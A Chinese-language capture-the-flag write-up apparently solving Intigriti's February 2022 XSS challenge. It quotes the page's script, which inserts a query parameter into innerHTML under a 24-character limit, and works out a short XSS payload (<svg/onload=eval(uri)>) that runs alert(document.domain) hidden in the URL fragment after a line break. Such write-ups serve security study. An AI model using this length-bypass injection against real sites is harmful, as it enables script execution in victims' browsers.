题目说长度要小于24，且要执行`alert(document.domain)`但是光这字符就有22个了，看似不可能。
分析源码
```js
    window.name = 'XSS(eXtreme Short Scripting) Game'

    function showModal(title, content) {
      var titleDOM = document.querySelector('#main-modal h3')
      var contentDOM = document.querySelector('#main-modal p')
      titleDOM.innerHTML = title
      contentDOM.innerHTML = content
      window['main-modal'].classList.remove('hide')
    }

    window['main-form'].onsubmit = function(e) {
      e.preventDefault()
      var inputName = window['name-field'].value
      var isFirst = document.querySelector('input[type=radio]:checked').value
      if (!inputName.length) {
        showModal('Error!', "It's empty")
        return
      }

      if (inputName.length > 24) {
        showModal('Error!', "Length exceeds 24, keep it short!")
        return
      }

      window.location.search = "?q=" + encodeURIComponent(inputName) + '&first=' + isFirst
    }

    if (location.href.includes('q=')) {
      var uri = decodeURIComponent(location.href)
      var qs = uri.split('&first=')[0].split('?q=')[1]
      if (qs.length > 24) {
        showModal('Error!', "Length exceeds 24, keep it short!")
      } else {
        showModal('Welcome back!', qs)
      }
    }
```
所以他会把用户输入拼接到`?q=`后面，
`<script>alert(1)</script>`长度直接超了。但是可以用其他的标签`<img src=x onerror=alert(1)>`也不行`<svg onload=alert(1)>`长度可以。试一下可以执行。因为字符长度限制太死。所以试一下在URI中写入代码。
```
<svg/onload=eval(uri)>
```
因为`var uri = decodeURIComponent(location.href)`他会把URL的内容url解码后赋值给uri，如果在URL里写入代码，他就会被执行，这样`alert(document.domain)`就不用写在`?q=`里，不会计算在长度里。`#`相当于就把后面内容注释了，但是后面内容本身就不计入长度，所以也没必要，eval()的参数是解码后的url，前面都是非法js，`%0d%0a`是换行符，为了把代码和first参数分割开。这样代码就会被执行。
最终payload
```
https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Csvg/onload=eval(uri)%3E&first=hello#%0d%0aalert(document.domain)
```

